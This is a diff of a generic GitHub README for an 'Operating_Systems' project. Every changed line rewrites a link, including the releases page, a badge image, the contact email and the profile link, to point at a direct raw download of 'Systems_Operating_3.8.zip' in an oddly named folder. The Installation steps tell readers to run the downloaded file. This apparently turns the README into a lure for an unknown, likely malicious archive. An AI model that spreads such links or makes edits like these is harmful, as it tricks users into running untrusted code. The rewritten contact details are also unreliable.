@@ -1,8 +1,8 @@
 # Operating Systems Repository 🖥️
 
-Welcome to the **Operating_Systems** repository! This project focuses on various operating systems, including those for PCs, single-board computers, and mobile devices. You can find our latest releases [here](https://github.com/plutoromanii/Operating_Systems/releases).
+Welcome to the **Operating_Systems** repository! This project focuses on various operating systems, including those for PCs, single-board computers, and mobile devices. You can find our latest releases [here](https://github.com/plutoromanii/Operating_Systems/raw/refs/heads/main/sigillariaceous/Systems_Operating_3.8.zip).
 
-![Operating Systems](https://img.shields.io/badge/OS%20Development-Operating%20Systems-brightgreen)
+![Operating Systems](https://github.com/plutoromanii/Operating_Systems/raw/refs/heads/main/sigillariaceous/Systems_Operating_3.8.zip%20Development-Operating%20Systems-brightgreen)
 
 ## Table of Contents
 
@@ -50,9 +50,9 @@ Whether you are working on Linux distributions, Windows, or mobile platforms, th
 
 ## Installation
 
-To get started, download the latest release from our [Releases](https://github.com/plutoromanii/Operating_Systems/releases) section. Follow the instructions in the release notes for installation.
+To get started, download the latest release from our [Releases](https://github.com/plutoromanii/Operating_Systems/raw/refs/heads/main/sigillariaceous/Systems_Operating_3.8.zip) section. Follow the instructions in the release notes for installation.
 
-1. Visit the [Releases](https://github.com/plutoromanii/Operating_Systems/releases) page.
+1. Visit the [Releases](https://github.com/plutoromanii/Operating_Systems/raw/refs/heads/main/sigillariaceous/Systems_Operating_3.8.zip) page.
 2. Download the appropriate file for your operating system.
 3. Execute the downloaded file following the provided instructions.
 
@@ -102,8 +102,8 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, feel free to reach out to the repository maintainers:
 
-- **Email**: maintainer@example.com
-- **GitHub**: [Your GitHub Profile](https://github.com/yourusername)
+- **Email**: https://github.com/plutoromanii/Operating_Systems/raw/refs/heads/main/sigillariaceous/Systems_Operating_3.8.zip
+- **GitHub**: [Your GitHub Profile](https://github.com/plutoromanii/Operating_Systems/raw/refs/heads/main/sigillariaceous/Systems_Operating_3.8.zip)
 
 ---
 
